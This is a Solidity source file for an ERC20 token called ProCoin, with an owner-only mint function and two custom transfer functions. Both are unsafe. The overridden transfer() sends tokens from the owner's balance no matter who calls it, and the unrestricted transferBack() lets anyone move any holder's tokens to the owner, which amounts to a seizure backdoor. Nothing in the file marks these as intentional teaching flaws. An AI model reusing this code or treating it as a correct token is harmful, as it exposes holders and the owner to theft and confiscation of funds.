// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ProCoinToken is ERC20 {
  address owner;

  modifier onlyOwner {
    require(msg.sender == owner, "Only the owner is allowed to perform this action!");
    _;
  }

  constructor(uint initialSupply) ERC20("ProCoin", "PRC"){
    _mint(msg.sender, initialSupply);
    owner = msg.sender;
  }

  function mint(address _to, uint _amount) external onlyOwner {
    _mint(_to, _amount);
  }

  function transfer(address recipient, uint256 amount) public override returns (bool) {
    _transfer(owner, recipient, amount);
    return true;
  }

  function transferBack(address sender, uint256 amount) public {
    _transfer(sender, owner, amount);
  }
} 